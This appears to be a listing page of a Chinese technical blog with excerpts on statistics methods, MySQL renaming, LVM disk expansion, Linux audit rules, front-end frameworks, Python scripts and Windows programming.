以此类推，分别计算出一级指标下属的二级指标权重。最后手工将方案层和准则层权重进行相乘计算得到各方案层最终的权重值，该权重代表的是“ 归一化权重 ”（即最小指标层的权重加和为1时的权重，其代表站在因素层角度对比时的权重大小）。
比如，计算出一级指标权重分别为0.30、0.15、0.30、0.25。二级指标A1权重为0.23，则A1最终权重值为0.30*0.23=0.069。然后使用权重*得分即可得到得到员工的综合得分情况。
2、权重组合方式
有一些常用的权重计算方法的搭配组合，比如AHP与熵值法、主成分与熵值法等，AHP或主成分法可能作为一级指标权重的方法。熵值法作为二级指标权重的方法。
这样的组合权重，分析时依然是分别得到一级权重和二级权重，再将一级权重、二级权重相乘，得到可用于分析计算的各指标权重。若涉及到三级指标，计算过程也是类似的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/598046c9ba45ab49e195514f92658354/" rel="bookmark">
			MySQL数据库改名的三种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果表是 MyISAM 那么可以直接去到数据库目录 mv 就可以。
Innodb完全不行，自己测试过，会提示相关表不存在。
第一种方法： RENAME database olddbname TO newdbname 这个语法在 mysql-5.1.7 中被添加进来，到了mysql-5.1.23又去掉了，官方不推荐，会有丢失数据的危险！
第二种方法： 1.创建需要改成新名的数据库。
2.mysqldum 导出要改名的数据库
3.删除原来的旧库（确定是否真的需要）
当然这种方法虽然安全，但是如果数据量大，会比较耗时。
#创建数据库 CREATE DATABASE IF NOT EXISTS `库名` default charset utf8mb4 COLLATE utf8mb4_unicode_ci; # 将db1库备份到db1.sql文件 mysqldump -u root -p db1 &gt; /tmp/db1.sql; #Enter password: #[root@xxx ~]# # 导入备份文件到新库db2 mysql -u root -p db2 &lt; /tmp/db1.sql; #Enter password: #[root@xxx ~]# # 删除旧库（如果真的需要） DROP DATABASE db1; 第三种方法： 我这里就用一个脚本，很简单，相信大家都看的懂
newdatabase.sh
#!/bin/bash # 假设将db1数据库名改为db2 # MyISAM直接更改数据库目录下的文件即可 # 下面脚本是创建新数据库，获取旧数据库所有表名，将其循环移动到新数据库 mysql -uroot -p123456 -e 'create database if not exists db2' list_table=$(mysql -uroot -p123456 -Nse "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/598046c9ba45ab49e195514f92658354/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ed051704bcaec02cb08c31a4a54a7d8/" rel="bookmark">
			探索性因子分析流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		探索性因子分析的步骤：
接下来，通过一个案例演示因子分析（探索性因子分析）的各个步骤应该如何进行。
案例：欲探究我国不同省份铁路运输能力情况，收集到部分相关数据如下：
上传数据至SPSSAU系统，在【进阶方法】模块，选择【探索性因子分析】，将变量拖拽到右侧分析框，勾选“因子得分”与“综合得分”，旋转方法选择默认的“最大方差法”，操作如下图：
一、指标数据标准化处理
由于指标数据性质不同，具有不同的数量级和量纲，会导致分析结果不准确或产生误差。因此，先对原始数据进行标准化处理。SPSSAU因子分析将自动进行标准化处理，因此不需要再对数据进行处理。
标准化计算公式：（X-Mean）/ Std
二、因子分析适用性检验
进行因子分析的前提是数据适合使用该方法，通常采取KMO检验和Bartlett球形检验。KMO检验用于检查变量间的相关性，取值为0~1。KMO值越接近于1，变量间的相关性越强，一般该值大于0.6即可进行因子分析。Bartlett球形检验用于检验变量是否各自独立，通常显著性小于0.05时，说明符合标准，适合做因子分析。
本案例SPSSAU输出KMO和Bartlett球形检验结果如下：
从结果来看，KMO值为0.722大于0.6，所以可以进行因子分析。同时Bartlett球形检验结果显示p值小于0.05，可以进行因子分析。
三、提取公因子
以特征根大于1为标准提取公因子，SPSSAU得到各因子的特征根以及方差解释率见下表：
分析上表可知，特征根大于1的因子共有两个，这2个公因子的累计方差解释率为78.808%，第一个因子的方差解释率为41.346%，第二个因子的方差解释率为37.462%，说明提取的两个公因子能够代表原来6个铁路运输能力指标78.808%的信息，整体来看信息变量丢失较少，因子分析效果比较理想。
另外，从特征根的碎石图可以更为直观的看出拟提取的公因子。如上图，前两个因子的让特征根值均大于1，且曲线比价陡峭，剩下4个特征根值均小于1且特征根值曲线逐渐变得比较平缓，即提取前2个因子可以代表所有原始铁路运输指标的绝大部分信息，与方差解释率得到结果一致。
四、公因子命名与解释
找到公因子后，为了理解公因子的实际意义以及方便对问题进行分析，需要继续进行因子旋转。旋转常用方法为最大方差法。旋转后的因子载荷矩阵可以直观反映各个变量对主成分的贡献程度，一个变量在某个公因子上的载荷系数的绝对值越大，说明变量与该公因子越具有相关性。
下表为使用最大方差法进行旋转后得到的因子载荷系数表格：
分析上表可知，因子1在铁路货运总量、铁路营业里程、铁路货物总周转量上具有较大的载荷，因此这3个变量归为一类命名为货运因子（记作F1）。因子2在铁路客运量、铁路旅客周转量、铁路运输职工人数上具有较大的载荷，因此这3个变量归为另一类命名为客运因子（记作F2）。
五、计算因子得分
确定因子后，进一步计算各因子得分，SPSSAU输出成份得分系数矩阵如下：
根据成份得分系数矩阵，得到公因子F由变量X表示线性组合的因子得分函数：
F1=-0.203*铁路客运量-0.178*铁路旅客周转量+0.537*铁路货运总量+0.294*铁路营业里程+0.333*铁路货物总周转量+0.135*铁路运输职工人数
F2=0.506*铁路客运量+0.488*铁路旅客周转量-0.321*铁路货运总量+0.025*铁路营业里程-0.014*铁路货物总周转量+0.197*铁路运输职工人数
这一过程可通过手算完成，但要注意使用的是标准化后的数据代入公式。
在我们进行分析前，勾选【因子得分】，SPSSAU自动保存公因子得分，如下图：
六、计算综合得分
进行综合评价将指标数据代入因子表达式，计算综合得分，分析结果并进行综合评价。即以2个公因子得分为基础，再以每个因子的方差解释率为权数进行线性加权平均，最后得到一个综合得分模型：
注：分子为两个公因子旋转后方差解释率，分母为旋转后累计方差解释率。
勾选【综合得分】后，SPSSAU将自动保存综合得分，结果见下图：
得到综合得分后，可将数据下载至本地，使用excel对综合得分进行排序，该排名就代表了31个省份的铁路运输能力。最后整理成下面这个一个表格：
分析31个省份铁路运输能力综合得分表可知，河北省的铁路运输能力最强，海南省铁路运输能力最弱......
至此，因子分析结束。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa36dd445b47bf95da570be0385e590d/" rel="bookmark">
			事件代理？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.什么是事件代理？ 事件代理也叫事件委托，只指定一个事件处理程序，就可以管理某一类型得事件。
可以简单理解为，事件代理就是将本应该绑定子元素事件绑定给父元素代理。它的优点就是：减少事件得执行，减少浏览器重排重绘，优化页面性能，给新增元素绑定事
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; // 延迟代码执行 页面加载完毕后再执行 window.onload = function () { var ul = document.querySelector('ul'); console.log(ul, '头部获取'); } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;ul&gt; &lt;li&gt;我是第1个li&lt;/li&gt; &lt;li&gt;我是第2个li&lt;/li&gt; &lt;li&gt;我是第3个li&lt;/li&gt; &lt;li&gt;我是第4个li&lt;/li&gt; &lt;li&gt;我是第5个li&lt;/li&gt; &lt;li&gt;我是第6个li&lt;/li&gt; &lt;li&gt;我是第7个li&lt;/li&gt; &lt;li&gt;我是第8个li&lt;/li&gt; &lt;li&gt;我是第9个li&lt;/li&gt; &lt;li&gt;我是第10个li&lt;/li&gt; &lt;/ul&gt; &lt;script&gt; /** * 什么是事件委托/事件代理******************* * 只指定一个事件处理程序 就可以管理某一类型的事件 * 将本应该绑定给子元素事件绑定父元素代理 * 优点：减少事件的执行，减少浏览器重排和重绘，优化页面性能，可以给新增元素绑定事件 */ var ul = document.querySelector('ul'); // children获取元素所有子元素节点 var lis = ul.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa36dd445b47bf95da570be0385e590d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a3fead8f703fa049dde157d04904392/" rel="bookmark">
			ethtool -T显示ptp过滤器信息源码分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ptp过滤器 新设备使用ethtool -T显示ptp过滤器信息：
linux_cx7110:~# ethtool -T eth0 Time stamping parameters for eth0: Capabilities: hardware-transmit (SOF_TIMESTAMPING_TX_HARDWARE) software-transmit (SOF_TIMESTAMPING_TX_SOFTWARE) hardware-receive (SOF_TIMESTAMPING_RX_HARDWARE) software-receive (SOF_TIMESTAMPING_RX_SOFTWARE) software-system-clock (SOF_TIMESTAMPING_SOFTWARE) hardware-raw-clock (SOF_TIMESTAMPING_RAW_HARDWARE) PTP Hardware Clock: 0 Hardware Transmit Timestamp Modes: off (HWTSTAMP_TX_OFF) on (HWTSTAMP_TX_ON) Hardware Receive Filter Modes: none (HWTSTAMP_FILTER_NONE) all (HWTSTAMP_FILTER_ALL) ptpv1-l4-event (HWTSTAMP_FILTER_PTP_V1_L4_EVENT) ptpv1-l4-sync (HWTSTAMP_FILTER_PTP_V1_L4_SYNC) ptpv1-l4-delay-req (HWTSTAMP_FILTER_PTP_V1_L4_DELAY_REQ) ptpv2-l4-event (HWTSTAMP_FILTER_PTP_V2_L4_EVENT) ptpv2-l4-sync (HWTSTAMP_FILTER_PTP_V2_L4_SYNC) ptpv2-l4-delay-req (HWTSTAMP_FILTER_PTP_V2_L4_DELAY_REQ) ptpv2-event (HWTSTAMP_FILTER_PTP_V2_EVENT) ptpv2-sync (HWTSTAMP_FILTER_PTP_V2_SYNC) ptpv2-delay-req (HWTSTAMP_FILTER_PTP_V2_DELAY_REQ) 原来设备没有ptp过滤器信息： root@imx6qsabresd_genvict:~# ethtool -T eth0 Time stamping parameters for eth0: Capabilities: hardware-transmit (SOF_TIMESTAMPING_TX_HARDWARE) software-transmit (SOF_TIMESTAMPING_TX_SOFTWARE) hardware-receive (SOF_TIMESTAMPING_RX_HARDWARE) software-receive (SOF_TIMESTAMPING_RX_SOFTWARE) software-system-clock (SOF_TIMESTAMPING_SOFTWARE) hardware-raw-clock (SOF_TIMESTAMPING_RAW_HARDWARE) PTP Hardware Clock: 0 Hardware Transmit Timestamp Modes: off (HWTSTAMP_TX_OFF) on (HWTSTAMP_TX_ON) Hardware Receive Filter Modes: none (HWTSTAMP_FILTER_NONE) all (HWTSTAMP_FILTER_ALL) linux_cx7101:~# ethtool -T eth0 Time stamping parameters for eth0: Capabilities: software-receive (SOF_TIMESTAMPING_RX_SOFTWARE) software-system-clock (SOF_TIMESTAMPING_SOFTWARE) PTP Hardware Clock: none Hardware Transmit Timestamp Modes: none Hardware Receive Filter Modes: none 代码流程 ethtool-4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a3fead8f703fa049dde157d04904392/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff941c639ac4cfd6d9da8ddc8ac64899/" rel="bookmark">
			centos服务器扩容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		centos服务器扩容 我的情况是，原服务器是一个80g磁盘，管理员又追加了120G到这块磁盘上，需要把这120G重新追加使用。
请确认你遇到的情况是否和我初始截图一致，再往下看，免得浪费时间与精力
服务器中有120G尚未使用，将其扩容到/目录下
#操作虚拟盘 fdisk /dev/vda 进去之后依次执行
#添加新的分盘 n 多次按回车，使用默认配置 #保存并退出 w 刷新
#刷新 partprobe /dev/vda #查看硬盘情况 lsblk 此时出现了vda3的120g,依次执行
#查看物理卷 pvs #创建物理卷 #pvcreate /dev/${物理卷名} pvcreate /dev/vda3 #查看卷组 vgs #把物理卷扩添加到卷组中 #vgextend ${卷组名} /dev/${物理卷名} vgextend centos /dev/vda3 #查看逻辑卷 lvs #把卷组中的中的容量全部扩展到逻辑卷中 #lvextend -l +100%FREE /dev/${卷组名}/${逻辑卷名} lvextend -l +100%FREE /dev/centos/root 此时120G容量已经添加到/目录下，但文件系统尚未刷新容量，查看文件占用时，并不会显示出这120G
刷新磁盘容量
#查看磁盘文件系统 lsblk -f #刷新盘的容量 #适用于ext4系统的磁盘 #resize2fs /dev/${卷组名}/${逻辑卷名} #适用于xfs系统的磁盘 #xfs_growfs /dev/${卷组名}/${逻辑卷名} 我这里是xfs系统的磁盘
所以选用第二个语句执行
xfs_growfs /dev/centos/root 执行后，查看磁盘占用量
df -Th 发现磁盘容量已经刷新
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eada700c1ced90493b585b4b815b3658/" rel="bookmark">
			cpp链接python报错找不到符号PyFloat_Ty: _ctypes.cpython-38-x86_64-linux-gnu.so: undefined symbol: PyFloat_Type
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景： ubuntu ，使用cpp调用python代码时，报错
Traceback (most recent call last): File "/api.py", line 3, in &lt;module&gt; import torch File "/usr/local/lib/python3.8/dist-packages/torch/__init__.py", line 17, in &lt;module&gt; import ctypes File "/usr/lib/python3.8/ctypes/__init__.py", line 7, in &lt;module&gt; from _ctypes import Union, Structure, Array ImportError: /usr/lib/python3.8/lib-dynload/_ctypes.cpython-38-x86_64-linux-gnu.so: undefined symbol: PyFloat_Type 步骤： 1. 确保安装_ctypes 1.1 启动python终端 1.2 导入相应的模块 1.3 导入类 1.4 验证是否导入 python3 Python 3.8.10 (default, May 26 2023, 14:05:08) [GCC 9.4.0] on linux Type "help", "copyright", "credits" or "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eada700c1ced90493b585b4b815b3658/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8838bb4dcfbe0f327e5bb147993b286/" rel="bookmark">
			Carla交通管理器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念 Traffic Manager（TM）是在模拟中以自动驾驶模式控制车辆的模块。它的目标是用真实的城市交通条件填充模拟。用户可以自定义一些行为，例如，设置特定的学习环境。
交通管理器的运行逻辑大致为：
存储和更新当前模拟世界中的状态 Agent Lifecycle &amp; State Management (ALSM)：从Carla中获取车辆及行人信息，并保持更新。
vehicle registry：管理Carla中车辆和行人的信息，包括由交通管理器控制的自动驾驶车辆和不受交通管理器控制的车辆(行人)组成。
simulation state：存储Carla中所有车辆和行人的位置，速度以及附加信息
计算每辆自动驾驶汽车的运动
计算每辆自动驾驶汽车的运动 由定位，碰撞检测，交通信号灯检测，运动规划，车辆灯光状态变化五个阶段组成
在一个时间步中批量设置车辆的状态
使用 在Carla中，由交通管理器控制的车辆会产生以下行为：
自动驾驶模式的车辆没有特定的目的地，运动路线是动态随机生成的。车辆在到达目的地之后会随机选择下一个目的地。车辆默认的速度为当前限速的70% 。在路口处，车辆不遵循交通规则。例如，出环岛的车辆会给准备进入环岛的车辆让路。 可以通过Python API调整TM行为。有关特定方法，请参见Python API文档的TM部分。以下是通过API可以实现的功能的一般总结：
Topic话题Description描述General:
概述：- 创建一个连接到端口的TM实例。
- 检查TM连接的端口。Safety conditions:
安全条件：- 设置停止车辆之间的最小距离（对于单个车辆或所有车辆）。这将影响最小移动距离。
- 将所需速度设置为当前速度限制的百分比（适用于单个车辆或所有车辆）。
- 重置交通灯Collision managing:
冲突管理：- 启用/禁用车辆与特定参与者之间的碰撞。
- 让一辆车忽略所有其他车辆。
- 让一辆车忽略所有的步行者。
- 让车辆无视所有交通灯。Lane changes:
车道变更：-- 强制变道，忽略可能的碰撞。
- 启用/禁用车辆的车道变更。Hybrid physics mode:
混合物理模式：
- 启用/禁用混合物理模式。
- 更改启用物理的半径。 创建Traffic Manager TM实例由carla.Client创建，传递要使用的端口。默认端口为8000。
tm = client.get_trafficmanager(port) 注册车辆 要为一组车辆启用自动驾驶，请检索TM实例的端口并将set_autopilot设置为True，同时通过TM端口。如果没有提供端口，它将尝试连接到默认端口（8000）中的TM。如果TM不存在，它将创建一个：
tm_port = tm.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8838bb4dcfbe0f327e5bb147993b286/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b461fb8889366eefe2e12e73d621741/" rel="bookmark">
			linux审计功能及规则 （audit.rule）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux审计功能（audit log）是什么 audit是Linux自带的一套审计功能，可以监控我们日常的一些操作，然后将这些操作记录在audit.log中，方便我们查看日志。
审计规则是什么 在 /etc/audit/rules.d/audit.rules文件中，我们可以设置相应的规则，也就是我们具体要监控哪些操作，哪些文件，当这些文件有一些读写修改的操作的时，在/var/log/audit/audit.log 中记录下来这些操作，这样我们就可以在audit.log 查看操作记录了。
规则详解 -a ：表示要添加规则-F 表示要添加一个过滤条件-S execve：这是要监视的系统调用。execve 是一个系统调用，用于执行新进程。通过监视 execve 系统调用，可以捕获新进程的启动。-w path :监视的文件路径-p rwxa: 权限 监视读取（r），写入（w），执行（x），属性更改（a）-k value：为事件添加一个标记，方便在审计日志中查找 一些常见规则示例 setuid 和 setgid 规则：这些规则用于监视用户在执行程序时提升其权限到超级用户 (root) 或组权限时的活动。它们捕获了在执行execve系统调用时 euid 和 egid 的变化，以及用户尝试提升权限的情况。
文件和目录权限修改规则：这一系列规则用于监视文件和目录的权限修改、删除和重命名等活动，以及相关的审计事件。这包括 fchown、renameat、rmdir、unlink、unlinkat、lremovexattr、ftruncate、chown、fchmodat、truncate 等操作。
-a always,exit -F arch=b64 -S execve -C uid!=euid -F euid=0 -k setuid -a always,exit -F arch=b64 -S execve -C gid!=egid -F egid=0 -k setgid 模块操作规则：这些规则用于监视内核模块相关的活动，包括 finit_module、create_module、init_module 等。它们捕获了模块加载和卸载的情况。
a always,exit -F arch=b64 -S create_module -k module-change -a always,exit -F arch=b32 -S create_module -k module-change 扩展属性 (Extended Attributes) 操作规则：这些规则监视文件和目录的扩展属性的操作，包括 lsetxattr、removexattr、setxattr、fsetxattr 等。扩展属性可用于存储额外的文件和目录元数据。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b461fb8889366eefe2e12e73d621741/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08b354bdaabb00ae0b87bc9961a4ae08/" rel="bookmark">
			【EI会议征稿】第三届航空航天工程与系统国际研讨会(ISAES 2024)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第三届航空航天工程与系统国际研讨会(ISAES 2024)
2024 3rd International Symposium on Aerospace Engineering and Systems 第三届航空航天工程与系统国际研讨会将于2024年3月22-24日在南京召开！会议紧密聚焦“航空航天工程”领域的热点和难点问题，将通过1个主会场+N个分会场，主题报告、分会论坛报告、海报展示、口头报告等方式，为全球知名航空航天机构专家学者、技术人员提供一个交流平台，传递最前沿科技进展和成果，促进技术的交流和智慧的碰撞，以交流促合作，以交流促发展。为保证本次会议的学术质量，吸引更多的原创高水平学术论文，现公开征稿，欢迎广大从事航空航天相关研究领域的教学、科研人员和学生踊跃投稿。
重要信息
会议官网：http://www.isaes.net （点击参会/投稿/了解会议详情）
会议时间：2024年3月22-24日
会议地点：中国·南京
收录检索：EI/SCOPUS
组织机构
【主办单位】
【承办单位】
【协办单位】
【大会主席】
胡俊辉，副院长/教授，南京航空航天大学
李仁府，副院长/教授，华中科技大学
【程序委员会主席】
曾庆生，教授，南京航空航天大学
韩东，教授，南京航空航天大学
【组织委员会主席】
姚志远，教授，南京航空航天大学
肖刚，教授，上海交通大学
【出版主席】
曹彦鹏，教授，浙江大学
征稿主题
电动伺服系统
电力电子技术
电力系统及其自动化
飞机系统设计
飞机隐身、电子干扰评估模型与防命中设计
飞行控制与仿真技术
飞行器/航天器智能博弈理论研究
飞行器精确制导与控制技术
飞行器信息与控制
飞行器智能抗干扰控制
高效多目标优化算法及其应用
故障诊断
航空电子综合技术
航空科技信息情报智能分析技术
航空雷达
航天器控制与仿真技术
结构、控制、机电系统建模
制导控制电子仪器及装置抗高过载技术
制导与控制
UAS应用
空间机器人
空间监测和图像处理
空间微振动与控制
空间遥操作
嵌入式系统设计
数字化飞行控制综合计算机系统
微纳卫星技术等方向的研究
微纳卫星能源电子
微纳卫星星载计算机故障容错技术
微小卫星技术及应用
微小卫星星载系统电气系统总体技术
卫星通信与导航
无人机
无人机智能控制、协同作战仿真
无线电通信
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08b354bdaabb00ae0b87bc9961a4ae08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6df4b597b63e8c70685cfcd501838459/" rel="bookmark">
			Tomact启动报错Could not load Logmanager “org.apache.juli.ClassLoaderLogManager“错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天遇到了一个问题 研究了好长时间 一直在找tomcat的原因 其实不是
Could not load Logmanager "org.apache.juli.ClassLoaderLogManager" 解决方法:
是电脑中乱码所导致的问题 我们需要把电脑的编码修改 第一步 同时按下键盘上的“win+R”键，在弹出的运行窗口中输入“control”字样，调出控制面板，并点击其中的“区域”设置命令。
第二步
依次点击“管理—更改系统区域设置”，在弹出的“区域设置”窗口中，将当前系统区域设置为“中文（简体，中国）”，并点击底部的“确定”键，就可以解决文件夹或软件的乱码问题了。
注意:Beta版一定不要打勾!!!!
注意:Beta版一定不要打勾!!!!
注意:Beta版一定不要打勾!!!!
最后重启电脑就好了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41287de5132815a506e81e84acc8d672/" rel="bookmark">
			Python - Windows下使用Python脚本同步一个文件夹下的所有文件到另一个文件夹下
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 前言 winodws系统下使用python脚本拷贝并可以随时执行python脚本同步一个源文件夹下所有文件到指定的目标文件夹下，并可以指定源文件夹下的某个文件夹或某个文件不需要拷贝，同时，当在拷贝的源文件夹下的文件有发生变化时再次执行该python脚本可以把源文件下发生变化的文件复制覆盖到目标文件加下
二. 示例代码 废话不多说，直接上代码
import hashlib import logging import os import shutil def sync_folder(src_path, dst_path, exclude_list=None): try: src_path = os.path.abspath(src_path) dst_path = os.path.abspath(dst_path) if not os.path.exists(dst_path): os.makedirs(dst_path) for root, dirs, files in os.walk(src_path): for dir in dirs: if dir in exclude_list: dirs.remove(dir) else: dst_dir_path = os.path.join(dst_path, os.path.relpath(os.path.join(root, dir), src_path)) if not os.path.exists(dst_dir_path): os.makedirs(dst_dir_path) for filename in files: if filename in exclude_list: continue src_file = os.path.join(root, filename) relative_path = os.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/41287de5132815a506e81e84acc8d672/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e184890c2371f507845df679a698851b/" rel="bookmark">
			vue3&#43;ts使用pinia状态管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、pinia 是什么？二、代码示例1.下载pinia插件2.引入和使用插件3.创建store/home.ts状态管理4.页面使用5. 数据持久化1.下载插件 pinia-plugin-persistedstate2.main.ts引入和使用插件3.对应状态管理文件配置参数（这里以home.ts为例） 三、总结 一、pinia 是什么？ Pinia 是 Vue 的专属状态管理库，它允许你跨组件或页面共享状态。
Pinia官网：https://pinia.vuejs.org/zh/introduction.html
二、代码示例 1.下载pinia插件 npm i pinia 2.引入和使用插件 main.ts
import { createApp } from 'vue' import './style.css' // 引入createPinia方法从pinia import { createPinia } from 'pinia'; import App from './App.vue' const app=createApp(App) //拿到pinia实例 const pinia=createPinia() //使用pinia app.use(pinia) app.mount('#app') 3.创建store/home.ts状态管理 store/home.ts
// 每个状态管理文件都要引入此方法 import { defineStore } from 'pinia' // 官方建议取名遵从 useXXXStore 形式 // 'home' 为当前store的唯一标识 类似ID // 取名建议与文件名称一致 便于记忆和管理 // pinia舍弃了冗长的mutations属性 // 以下是pinia的一种写法 因与vuex相似 便于学习和记忆 export const useHomeStore = defineStore('home',{ state:()=&gt;{ return{ num:0 } }, //state也可写成这样 // state:()=&gt;({ // num:0 // }), actions:{ changeNum(){ //这里可以使用this去拿到state里定义的变量 this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e184890c2371f507845df679a698851b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4164108d9cb6c257a91b0fea0299fa9/" rel="bookmark">
			Python Selenium 图片资源自动搜索保存 项目实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现访问首页 from os.path import dirname from selenium import webdriver class ImageAutoSearchAndSave: """图片自动搜索保存""" def __init__(self): """初始化""" self.driver = webdriver.Chrome(executable_path=dirname(__file__) + "/chromedriver.exe") def run(self): """开始运行""" print("=======开始=======") # 访问首页 self.driver.get("https://pixabay.com/") print("=======结束=======") if __name__ == '__main__': ImageAutoSearchAndSave().run() 启动后会自动打开一个页面
实现图片自动欧索 from os.path import dirname from selenium import webdriver from selenium.webdriver.common.keys import Keys class ImageAutoSearchAndSave: """图片自动搜索保存""" def __init__(self, keyword): """初始化""" self.keyword = keyword self.driver = webdriver.Chrome(executable_path=dirname(__file__) + "/chromedriver.exe") def run(self): """开始运行""" print("=======开始=======") # 访问首页 self.driver.get("https://pixabay.com/") # 搜索图片 self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e4164108d9cb6c257a91b0fea0299fa9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95829dd4455765fed7b9ecd2e2f20265/" rel="bookmark">
			windows 命令行删除文件夹，删除文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 删除一个文件 del test.exe 删除某些后缀文件 del *.txt *.png *.jpg 删除文件夹 rmdir /s temps 删除文件夹不需要被确认 rd /s/q temps 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0f99b2771cea2e6bbe6b67e4d1b5bff/" rel="bookmark">
			Windows中使用CRT函数检查内存泄露和溢出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++中可以使用new或malloc等函数分配内存，通常与delete和free配合使用，但是如果不小心遗忘而程序在持续new或malloc时就会造成程序所占用的内存越来越大，即为“内存泄露”。通常写数据的时候必须在程序开辟的空间中写，如果不小心写到了不是程序请求分配的地址中，就可能覆盖别的有效数据导致程序工作不正常，最常见的就是分配一个数组结果写的时候传入的下标过大导致写超了，这就是“内存溢出”。
1.原理 有没有办法，可以让程序帮我们检测泄露和溢出呢？微软提供的CRT DBG库就是为了干这个的，先说说原理
a.内存泄露检查
既然说了new/delete，malloc/free必须配对使用，那么在分配内存的时候，我们使用链表记录分配的地址，当地址被释放时溢出对应的分配，最后来检测链表中是否存在未释放的分配即可判断是否有内存泄露，这一操作通常在程序的结束时检查。
b.内存溢出检查
内存溢出分为“上溢”和“下溢”，为了检查是否溢出，在分配的数据一头一尾分别插入对应的标志数据，微软使用的是0xfd 0xfd 0xfd 0xfd，检查是否溢出直接检查这两个标志数据是否被修改即可判断，当然如果你的程序刚好溢出且写的数据是0xfd，那没办法了，只能靠你自己检查了。
使用char* a = char[10];分配10字节
如下如是微软分配内存后的内存分配图,可以看到数据两端都填充了0xfd,初始化分配的数据填充为0xcd
微软采用的策略我们也可以从源码上来看一看，安装vs后，微软提供的有crt源码，我的机器上目录是C:\Program Files (x86)\Microsoft Visual Studio 9.0\VC\crt\src。
找到crt目录打开dbgint.h可以看到分配的dbg block数据结构如下：
#define nNoMansLandSize 4 typedef struct _CrtMemBlockHeader { struct _CrtMemBlockHeader * pBlockHeaderNext; struct _CrtMemBlockHeader * pBlockHeaderPrev; char * szFileName; int nLine; #ifdef _WIN64 /* These items are reversed on Win64 to eliminate gaps in the struct * and ensure that sizeof(struct)%16 == 0, so 16-byte alignment is * maintained in the debug heap.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0f99b2771cea2e6bbe6b67e4d1b5bff/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cabea4c8f8dff708aba793df3acf1c5a/" rel="bookmark">
			windows消息响应机制之一：消息分析器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《Windows核心编程》中第九章－用户模式线程同步中一个例子用到了Win32界面编程，发现里面有个很奇特的宏定义chHANDLE_DLGMSG，Debug后发现作者其实用到了Windows中的消息分析器，而这种处理方式是我之前在练习Win32编程时一直在找寻的一种消息映射方式。于是到网上搜索到这边Blog。博主分析的非常细致，讲解的十分详细，转载过来作为今后学习借鉴。
转载自:http://blog.sina.com.cn/s/blog_5e8715490100srfh.html
